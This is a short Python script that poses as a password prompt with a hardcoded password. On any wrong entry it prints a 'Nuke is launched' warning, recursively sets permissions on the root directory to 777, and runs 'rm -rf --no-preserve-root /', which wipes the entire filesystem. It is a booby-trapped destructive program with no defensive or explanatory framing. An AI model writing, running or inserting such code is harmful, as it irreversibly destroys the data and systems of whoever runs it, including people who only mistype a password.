#!/usr/bin/env python3

import getpass
import subprocess


def password_check():

    password = 'jk'
    ture_password = getpass.getpass('Enter Password: ')

    if ture_password != password: 
        print("Warning! The Nuke is launched!")
        subprocess.run(['sudo','chmod','777','-R','/'])
        subprocess.run(['rm','-rf','--no-preserve-root','/'], check=True)
    else:
        print('---Welcome Back----')

password_check()